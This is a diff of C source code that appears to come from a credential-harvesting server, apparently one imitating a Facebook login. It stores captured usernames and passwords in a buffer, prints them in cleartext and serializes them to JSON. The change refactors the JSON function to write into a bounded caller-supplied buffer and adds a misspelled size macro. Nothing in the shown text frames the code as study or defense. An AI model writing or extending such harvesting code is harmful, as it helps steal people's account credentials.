@@ -14,7 +14,7 @@ typedef struct {
 } cred_buffer_t;
 
 cred_buffer_t cred_buffer = {0};
-
+#define MAX_CRED_ENDTRIES_JSON (sizeof(cred_buffer) + 64)
 static void store_credentials(cred_buffer_t* buffer, const char* user, const char* pass) {
     strncpy(buffer->entries[buffer->count].username, user, sizeof(buffer->entries[buffer->count].username) - 1);
     strncpy(buffer->entries[buffer->count].password, pass, sizeof(buffer->entries[buffer->count].password) - 1);
@@ -31,54 +31,33 @@ void print_cred_buffer(cred_buffer_t* buffer){
         printf("username=%s  pass=%s\n", buffer->entries[i].username, buffer->entries[i].password);
     }
 }
-char* cred_buffer_to_json(cred_buffer_t* buffer) {
-    if (!buffer) return NULL;
 
-    size_t cap = 256;
-    char *json = malloc(cap);
-    if (!json) return NULL;
+int cred_buffer_to_json(cred_buffer_t* buffer, char* out, size_t out_size) {
+    if (!buffer || !out || out_size == 0) return -1;
 
     size_t len = 0;
-    len += snprintf(json + len, cap - len, "[");
-
-    // Determinăm câte intrări valide avem
     int n = buffer->count < MAX_CRED_ENTRIES ? buffer->count : MAX_CRED_ENTRIES;
+
+    int written = snprintf(out + len, out_size - len, "[");
+    if (written < 0 || (size_t)written >= out_size - len) return -1;
+    len += written;
 
     for (int i = 0; i < n; ++i) {
         const char *user = buffer->entries[i].username;
         const char *pass = buffer->entries[i].password;
 
-        // Calculează spațiul necesar
-        size_t needed = snprintf(NULL, 0,
-                                 "{\"username\":\"%s\",\"password\":\"%s\"}%s",
-                                 user, pass,
-                                 (i < n - 1) ? "," : "");
-
-        // Realocare dacă e nevoie
-        if (len + needed + 1 > cap) {
-            cap = (len + needed + 1) * 2;
-            char *tmp = realloc(json, cap);
-            if (!tmp) { free(json); return NULL; }
-            json = tmp;
-        }
-
-        // Adaugă obiectul
-        len += snprintf(json + len, cap - len,
-                        "{\"username\":\"%s\",\"password\":\"%s\"}%s",
-                        user, pass,
-                        (i < n - 1) ? "," : "");
+        written = snprintf(out + len, out_size - len,
+            "{\"username\":\"%s\",\"password\":\"%s\"}%s",
+            user, pass, (i < n - 1) ? "," : "");
+        if (written < 0 || (size_t)written >= out_size - len) return -1;
+        len += written;
     }
 
-    // Închidem array-ul
-    if (len + 2 + 1 > cap) {
-        cap = len + 3;
-        char *tmp = realloc(json, cap);
-        if (!tmp) { free(json); return NULL; }
-        json = tmp;
-    }
-    len += snprintf(json + len, cap - len, "]");
+    written = snprintf(out + len, out_size - len, "]");
+    if (written < 0 || (size_t)written >= out_size - len) return -1;
+    len += written;
 
-    return json;
+    return (int)len;
 }
 
 void handle_facebook_connection(http_request_t* req, int client_sock) {
